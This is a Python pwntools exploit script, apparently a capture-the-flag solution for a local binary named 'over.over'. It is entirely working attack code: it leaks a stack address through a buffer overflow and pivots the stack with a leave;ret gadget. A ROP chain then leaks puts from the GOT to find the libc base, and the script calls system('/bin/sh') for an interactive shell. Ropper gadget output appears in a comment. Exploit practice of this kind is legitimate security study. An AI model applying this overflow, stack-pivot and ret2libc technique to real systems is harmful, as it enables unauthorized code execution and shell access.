#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
p = process('./over.over')
elf = ELF('./over.over')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# gdb.attach(p)

offset = 80
p.sendafter('>', 'A' * (offset - 1) + ':')
p.recvuntil(':')
data = p.recv(6).ljust(8, '\x00')
stack = u64(data) - 0x70
success('stack = ' + hex(stack))

'''
$ ropper --file ./over.over --search "leave|ret"
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: leave|ret

[INFO] File: ./over.over
0x00000000004007d0: ret 0xfffe; 
0x00000000004006be: leave; ret; 
0x0000000000400509: ret; 

0x0000000000400793 : pop rdi ; ret
'''

main_addr = 0x400676
pop_rdi_ret = 0x400793
leave_ret = 0x4006be
payload = flat([
	'A' * 8, 
	pop_rdi_ret, 
	elf.got['puts'], 
	elf.plt['puts'], 
	main_addr
])
tmp = offset - len(payload)
payload += flat([
	tmp * 'B', 
	stack, 
	leave_ret
])
p.sendafter('>', payload)
puts_offset = libc.symbols['puts']
success('puts_offset = ' + hex(puts_offset))
p.recvuntil('\n')
data = p.recv(6).ljust(8, '\x00')
libc_base = u64(data) - puts_offset
success('libc_base = ' + hex(libc_base))

str_bin_sh = libc_base + next(libc.search('/bin/sh'))
system = libc_base + libc.symbols['system']
success('str_bin_sh = ' + hex(str_bin_sh))
success('system = ' + hex(system))
payload = flat([
	'A' * 8, 
	pop_rdi_ret, 
	str_bin_sh, 
	system, 
])
tmp = offset - len(payload)
payload += flat([
	tmp * 'B', 
	stack - tmp, 
	leave_ret
])
p.sendafter('>', payload)
p.interactive()
